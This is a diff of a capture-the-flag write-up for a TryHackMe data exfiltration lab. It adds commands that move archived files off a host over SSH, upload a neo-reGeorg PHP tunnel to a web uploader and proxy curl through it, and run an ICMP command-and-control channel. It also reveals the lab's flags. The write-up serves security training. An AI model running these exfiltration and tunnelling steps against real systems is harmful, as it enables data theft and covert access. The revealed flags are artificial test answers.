@@ -59,7 +59,7 @@ This guide contains the answer and steps necessary to get to them for the [Data 
    ssh thm@victim1.thm.com
    ```
 
-   TCP LISTENER
+   ![TCP Listener](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_TCP_Listener.png)
 
    Next we compress and encode the data we want to exfiltrate in the 'task4' folder.
 
@@ -69,7 +69,7 @@ This guide contains the answer and steps necessary to get to them for the [Data 
 
    This command will also send the data over the TCP socket.
 
-   TCP EXFILTRATE
+   ![TCP Exfiltrate](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_TCP_Exfiltrate.png)
 
    Now that the files have been transfered to the jump server, we can decode en decompress the archive to get to the files.
 
@@ -78,9 +78,11 @@ This guide contains the answer and steps necessary to get to them for the [Data 
    tar xvf task4-creds.tar
    ```
 
-   TCP FILES
+   ![TCP Files](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_TCP_Files.png)
 
 ### Exfiltration using SSH
+
+
 
 1. All packets sent using the Data Exfiltration technique over SSH are encrypted! (T=True/F=False)
 
@@ -96,59 +98,129 @@ This guide contains the answer and steps necessary to get to them for the [Data 
    tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
    ```
 
-   SSH EXFILTRATE
+   ![SSH Exfiltrate](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_SSH_Exfiltrate.png)
 
-   SSH FILES
+   ![SSH Files](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_SSH_Files.png)
 
 ### Exfiltrate using HTTP(S)
 
 1. Check the Apache log file onweb.thm.comand get the flag!
 
+   After ssh'ing into the web server through the jumpserver, we can look at the log file.
 
+   ```console
+   sudo cat /var/log/apache2/access.log
+   ```
 
-   ><details><summary>Click for answer</summary></details>
+   ![HTTP Flag 1](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_HTTP_Flag_1.png)
 
-2. When you visit thehttp://flag.thm.com/flagwebsite through the uploader machine via the HTTP tunneling technique, what is the flag?
+   This gives us the flag in base64 format. Decoding this gives us the flag.
 
+   ```console
+   echo VEhNe0g3N1AtRzM3LTE1LWYwdW42fQo= | base64 -d
+   ```
 
+   ![HTTP Flag 1 Decoded](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_HTTP_Flag_1_Decoded.png)
 
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>THM{H77P-G37-15-f0un6}</details>
+
+2. When you visit the http://flag.thm.com/flag website through the uploader machine via the HTTP tunneling technique, what is the flag?
+
+   First thing to do to create our HTTP tunnel using `neo-regeorg` is to generate a key
+
+   ```console
+   python3 neoreg.py generate -k thm 
+   ```
+
+   ![HTTP Neo Key](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_HTTP_Neo_Key.png)
+
+   Now we can upload the tunnel to the webserver at `http://10.10.230.138/uploader` with the key 'admin'.
+
+   ![HTTP Upload Tunnel](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_HTTP_Upload_Tunnel.png)
+
+   Next we can start the tunnel using the key and the URL to the uploaded file.
+
+   ```console
+   python3 neoreg.py -k thm -u http://10.10.230.138/uploader/files/tunnel.php
+   ```
+   
+   ![HTTP Neo Tunnel](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_HTTP_Neo_Tunnel.png)
+
+   When this is done we can use `curl` to tunnel to the flag server. The proxy is bound to our machine with `127.0.0.1:1080`.
+
+   ```console
+   curl --socks5 127.0.0.1:1080 http://172.20.0.120:80
+   ```
+
+   ![HTTP Get Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_HTTP_Get_Flag.png)
+
+   This is not our flag. But it does point us to the correct page.
+
+   ```console
+   curl --socks5 127.0.0.1:1080 http://172.20.0.120:80/flag
+   ```
+
+   ![HTTP Flag 2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_HTTP_Flag_2.png)
+
+   ><details><summary>Click for answer</summary>THM{H77p_7unn3l1n9_l1k3_l337}</details>
 
 ### Exfiltration using ICMP
 
 1. In which ICMP packet section can we include our data?
 
+   This answer can be found in the text.
 
-
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>data</details>
 
 2. Follow the technique discussed in this task to establish a C2 ICMP connection between JumpBox and ICMP-Host. Then execute the "getFlag" command. What is the flag?
 
+   On the icmp server we initiate the `icmpdoor` binary and on the jump server we initiate the `icmp-cnc` binary.
 
+   ```console
+   sudo icmpdoor -i eth0 -d 192.168.0.133
+   ```
 
-   ><details><summary>Click for answer</summary></details>
+   ```console
+   sudo icmp-cnc -i eth1 -d 192.168.0.121
+   ```
+
+   Now that a connection has been established, we can send commands to the icmp server.
+
+   ![Icmp Get Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_Icmp_Get_Flag.png)
+
+   ><details><summary>Click for answer</summary>THM{g0t-1cmp-p4k3t!}</details>
 
 ### DNS Configurations
 
 1. Once the DNS configuration works fine, resolve theflag.thm.comdomain name. What is the IP address?
 
+   Simply using the command `dig +short flag.thm.com` should give us the ip of the flag server. 
 
+   However, if we want to use the attack box itself, we must change its DNS settings. Edit the nameserver in the following file to `10.10.230.138`:
 
-   ><details><summary>Click for answer</summary></details>
+   ```console
+   nano /etc/resolv.conf
+   ```
+
+   Now this command will also work from our attack box.
+
+   ![DNS IP](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_DNS_IP.png)
+
+   ><details><summary>Click for answer</summary>172.20.0.120</details>
 
 ### Exfiltration over DNS
 
 1. What is the maximum length for the subdomain name (label)?
 
+   The answer can be found in the text.
 
-
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>63</details>
 
 2. The Fully Qualified FQDN domain name must not exceed ______characters.
 
+   The answer can be found in the text.
 
-
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>255</details>
 
 3. Execute the C2 communication over the DNS protocol of theflag.tunnel.com. What is the flag?
 
